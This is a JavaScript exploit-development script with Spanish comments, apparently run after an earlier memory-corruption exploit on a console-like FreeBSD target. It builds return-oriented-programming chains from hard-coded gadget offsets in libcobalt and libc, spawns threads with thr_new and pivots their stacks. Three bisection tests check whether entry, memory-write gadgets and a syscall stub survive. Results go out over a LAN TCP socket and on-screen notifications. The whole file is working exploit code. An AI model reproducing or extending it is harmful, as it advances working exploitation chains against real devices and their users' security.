// 2026-08-27 rop_bisect2_1320: escalera de biseccion (3 tests) para localizar el eslabon que mata el hilo ROP: entry+pop_rsp (demostrado en pivot de main.js:782) -> gadgets de escritura por buffer -> STUB/TLS.
// A: cadena 2q [&pop_rsp,A] spin puro (entrada+pop_rsp+ret). B: anade pop_rax+pop_rdi+mov[rdi],rax (escritura buf1==MARK). C: anade STUB libc+0x19E34F getpid(20) sin TLS (rax->buf2). Cada test usa su propio mmap 0x400000 y su thread.
// HILOS DEJADOS VIVOS A PROPOSITO: bucles loopback inocuos; NO thr_kill2, NO munmap de stacks vivos. Canal: W() TCP 192.168.1.67:8081 + N() send_notification; polls acotados; cero lectura de modulos.
(() => {
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x);const WB=malloc(512);let sock=-1n;
const N=(s)=>{try{send_notification(s);}catch(e){}};
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);if(I(syscall(SYSCALL.connect,sock,sa,16n))<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
const STK=0x400000n,MARK=0x4141414141414141n;let pid=0n;const g={};let okb=false;
if(typeof libcobalt_base!=="undefined"&&typeof libc_base!=="undefined"&&B(libcobalt_base)!==0n&&B(libc_base)!==0n){const c=B(libcobalt_base),L=B(libc_base);
g.pop_rsp=c+0x6f7c7n;g.pop_rax=c+0x35942n;g.pop_rdi=c+0x54bn;g.pop_rsi=c+0x26a5n;g.pop_rdx=c+0x81300n;g.pop_rcx=c+0x25e9n;g.pop_r8=c+0x35941n;g.pop_r9=c+0x3d9132n;g.mov_qword_rdi_rax=c+0x6fcecn;g.STUB=L+0x19E348n+7n;okb=true;}
// spawn identico a bisect v1: top-down, [top-8]=A, ch[N-1]=A (loopback); tf_rip=pop_rsp, tf_rsp=top-8; tls=0/fs=0.
const spawnLoop=(ch)=>{
const base=I(syscall(SYSCALL.mmap,0n,STK,3n,MAP_PRIVATE|MAP_ANONYMOUS,B(-1),0n));
if(base<=0n){W("[bisect2] mmap stack ERR: "+get_error_string());return null;}
const top=base+STK,N2=ch.length,A=top-8n*B(N2);ch[N2-1]=A;
for(let i=0;i<N2;i++)write64(A+8n*B(i),ch[i]);write64(top-8n,A);
const tp=malloc(0x68);for(let i=0;i<0x68;i+=8)write64(tp+BigInt(i),0n);const ct=malloc(8);write64(ct,0n);
write64(tp,g.pop_rsp);write64(tp+8n,0n);write64(tp+0x10n,base);write64(tp+0x18n,STK);write64(tp+0x30n,ct);
const tr=I(syscall(SYSCALL.thr_new,tp,B(0x68)));
if(tr<0n){W("[bisect2] thr_new ERR: "+get_error_string());syscall(SYSCALL.munmap,base,STK);return null;}
const tid=B(read32(ct));if(tid===0n){W("[bisect2] tid=0");syscall(SYSCALL.munmap,base,STK);return null;}
return{base:base,A:A,tid:tid};};
// poll acotado: 50000 yields, read64 buffer PROPIO cada 32; primer !=0 o 0.
const poll=(buf)=>{for(let i=0;i<50000;i++){syscall(SYSCALL.sched_yield);if(i%32===0){const v=B(read64(buf));if(v!==0n)return v;}}return B(read64(buf));};
try{
try{pid=I(syscall(SYSCALL.getpid));}catch(e){}
W("[bisect2] pid="+toHex(pid)+" cob="+(okb?toHex(B(libcobalt_base)):"NO")+" libc="+(okb?toHex(B(libc_base)):"NO")+" STUB="+(okb?toHex(g.STUB):"?"));
if(!okb){W("[bisect2] ABORT: sin bases");N("[bisect2] abort no-bases");return;}
let rA="EX",rB="EX",rC="EX";
// TEST A: entrada+pop_rsp+ret, sin buffers ni STUB. Cadena 2q: [A]=&pop_rsp,[A+8]=A -> spin infinito. Si el usuario ve A=OK el hilo sobrevivio; si el proceso murio, la notificacion NO sale (=A=FALLO).
W("[bisect2] TEST A lanzando");
const cA=[g.pop_rsp,0n]; // 2q; [1]=A lo fija spawnLoop
const tA=spawnLoop(cA);
if(!tA){rA="spawn-fallo";N("[bisect2] A=spawn-fallo");}else{
W("[bisect2] A tid="+tA.tid+" spin pop_rsp A="+toHex(tA.A));
for(let i=0;i<15000;i++)syscall(SYSCALL.sched_yield); // espera acotada ~3s: sobrevivi?
rA="OK";N("[bisect2] A=OK");}
// TEST B: anade escritura por buffer (pop_rax+pop_rdi+mov[rdi],rax). Loopback igual que v1: ultimo par [&pop_rsp,A].
const buf1=malloc(8);write64(buf1,0n);
const cB=[g.pop_rax,MARK,g.pop_rdi,buf1,g.mov_qword_rdi_rax,g.pop_rsp,0n]; // 7q; [6]=A lo fija spawnLoop
W("[bisect2] TEST B lanzando");
const tB=spawnLoop(cB);
if(!tB){rB="spawn-fallo";N("[bisect2] B=spawn-fallo");}else{
W("[bisect2] B tid="+tB.tid+" bucle marker->buf1 A="+toHex(tB.A));
const v1=poll(buf1);
if(v1===MARK){rB="OK";W("[bisect2] B=OK entrada+gadgets escritura OK (MARK en buf1)");N("[bisect2] B=OK");}
else{rB="FALLO";W("[bisect2] B=FALLO buf1="+toHex(v1)+" (gadgets de escritura matan el hilo)");N("[bisect2] B=FALLO (buf="+toHex(v1)+")");}}
// TEST C: STUB sin TLS + escritura pid->buf2. getpid=20=0x14 (global.js SYSCALL.getpid). rax=20 Y rdi=20: cinturon p/ 2 semanticas del STUB.
const buf2=malloc(8);write64(buf2,0n);
const cC=[g.pop_rax,20n,g.pop_rdi,20n,g.pop_rsi,0n,g.pop_rdx,0n,g.pop_rcx,0n,g.pop_r8,0n,g.pop_r9,0n,g.STUB,g.pop_rdi,buf2,g.mov_qword_rdi_rax,g.pop_rsp,0n]; // 20q; [19]=A lo fija spawnLoop
W("[bisect2] TEST C lanzando");
const tC=spawnLoop(cC);
if(!tC){rC="spawn-fallo";N("[bisect2] C=spawn-fallo");}else{
W("[bisect2] C tid="+tC.tid+" bucle getpid(20) via STUB->buf2 A="+toHex(tC.A));
const v2=poll(buf2);
if(v2!==0n){rC="OK";W("[bisect2] C=OK STUB sin TLS OK pid_leido="+toHex(v2)+" match="+(v2===pid));N("[bisect2] C=OK pid="+toHex(v2)+" match="+(v2===pid));}
else{rC="FALLO";W("[bisect2] C=FALLO: STUB colgado/muerto (fs=0/TLS)");N("[bisect2] C=FALLO");}}
const resum="[bisect2] RESUMEN: A="+rA+" B="+rB+" C="+rC+" (A F=entrada; B F=gadgets; C F=STUB/TLS)";W(resum);
// bucle resumen c/~3s x40 = ~2min (40x3000 sched_yield acotados); <60 chars p/ banner
const nres=("[bisect2] A="+rA+" B="+rB+" C="+rC).slice(0,59);
for(let i=0;i<40;i++){try{send_notification(nres);}catch(e){}for(let j=0;j<3000;j++)syscall(SYSCALL.sched_yield);}
// reenvio TCP: socket+connect misma sockaddr x3 intentos; W(resum); cierra entre intentos
for(let a=0;a<3;a++){sock=-1n;try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock>=0n){const sa2=malloc(16);write8(sa2,16);write8(sa2+1n,2);write16(sa2+2n,0x911Fn);write32(sa2+4n,0x4301A8C0n);write64(sa2+8n,0n);if(I(syscall(SYSCALL.connect,sock,sa2,16n))===0n)W(resum);syscall(SYSCALL.close,sock);sock=-1n;}}catch(e){if(sock>=0n){try{syscall(SYSCALL.close,sock);}catch(e2){}sock=-1n;}}}
}catch(e){W("[bisect2] EX fatal: "+e);N("[bisect2] abort EX");}
try{if(sock>=0n)syscall(SYSCALL.close,sock);}catch(e){}
})();
